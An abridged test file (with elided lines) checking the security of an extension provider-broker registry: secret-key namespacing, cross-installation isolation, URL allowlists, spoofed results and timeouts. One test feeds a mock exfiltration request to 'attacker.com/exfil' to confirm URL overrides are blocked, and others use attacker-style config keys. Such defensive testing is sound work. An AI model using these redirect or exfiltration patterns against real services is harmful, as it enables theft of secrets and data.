...
import { PROVIDER_REQUEST_MAX_BYTES, ProviderRegistry, measureJsonBytes, parseExtensionSecretKey, } from "./provider-registry";
function brokerRegistry(overrides = {}) {
    const fetchedUrls = [];
...
describe("provider broker security", () => {
    ...
    test("prepareBroker and completeBroker reject unnamespaced secretKeys before any fetch", async () => {
        ...
        try {
            ...
            threw = true;
            expect(err.message).toMatch(/authorization denied/);
        }
        ...
        await expect(registry.completeBroker({
            kind: "embedding",
            url: "https://provider.test/embed",
            method: "POST",
            headers: {},
    ...
    test("system scope rejects unnamespaced and cross-installation secretKeys", () => {
        const { registry } = brokerRegistry();
        const systemHost = { installScope: "system", installationId: "inst-sys" };
        expect(() => registry.prepareBroker({
            kind: "sidecar",
            url: "https://provider.test/v1",
            secretKey: "openai_api_key",
            correlationId: "sys-sec-1",
        }, systemHost)).toThrow(/authorization denied/);
        expect(() => registry.prepareBroker({
            kind: "sidecar",
            url: "https://provider.test/v1",
            secretKey: "extension:inst-other:api-key",
            correlationId: "sys-sec-2",
        }, systemHost)).toThrow(/does not match installation/);
    });
    test("missing system-principal secret row reports provider secret is not available", async () => {
        ...
        }, { installScope: "system", installationId: "inst-sys" });
    ...
    test("invoke cannot override the registration-time broker url", async () => {
        ...
        const response = await registry.invoke({ effectiveScope: "user:alice", installationId: "inst-a", kind: "sidecar", id: "tools" }, { url: "https://attacker.com/exfil", body: { steal: true } }, { callerScope: "user:alice", correlationId: "url-1" });
    ...
    test("enforcement survives a mid-life configure() update of the allowlist", () => {
        ...
        expect(() => registry.register({
            ...
            id: "after",
            broker: { kind: "stt", url: "https://anything.test/stt" },
        }, base)).toThrow(/origin is not approved/);
        expect(() => registry.register({
            kind: "stt",
            id: "after-ok",
            broker: { kind: "stt", url: "https://approved.test/stt" },
    ...
    test("allowlistKey must match an approved broker configuration", () => {
        ...
        expect(() => approved.prepareBroker({
            kind: "sidecar",
            url: "https://good.test/v1",
            allowlistKey: "attacker-config",
            correlationId: "al-1",
        }, base)).toThrow(/not an approved broker configuration/);
        expect(approved.prepareBroker({
            kind: "sidecar",
            url: "https://good.test/v1",
            allowlistKey: "sidecar",
            correlationId: "al-2",
        }, base).correlationId).toBe("al-2");
    });
    test("cross-installation provider_result is rejected", async () => {
        ...
        registry.register({ kind: "embedding", id: "foo" }, { installationId: "inst-b", installScope: "user", authenticatedSubject: "bob" });
        const pending = registry.invoke({ effectiveScope: "user:alice", installationId: "inst-a", kind: "embedding", id: "foo" }, { text: "hello" }, { callerScope: "user:alice", correlationId: "x-inst-1" });
        ...
        expect(registry.handleProviderResult({
            ...
            round: 1,
            result: { spoofed: true },
        }, { installationId: "inst-b", installScope: "user", installedByUserId: "bob" })).toBe(false);
    ...
    test("timed-out invocations release their correlationId and timer", async () => {
        ...
        registry.register({ kind: "stt", id: "transcribe" }, { installationId: "inst-a", installScope: "user", authenticatedSubject: "alice" });
        const pending = registry.invoke({ effectiveScope: "user:alice", installationId: "inst-a", kind: "stt", id: "transcribe" }, { audio: "bytes" }, { callerScope: "user:alice", correlationId: "leak-1" });
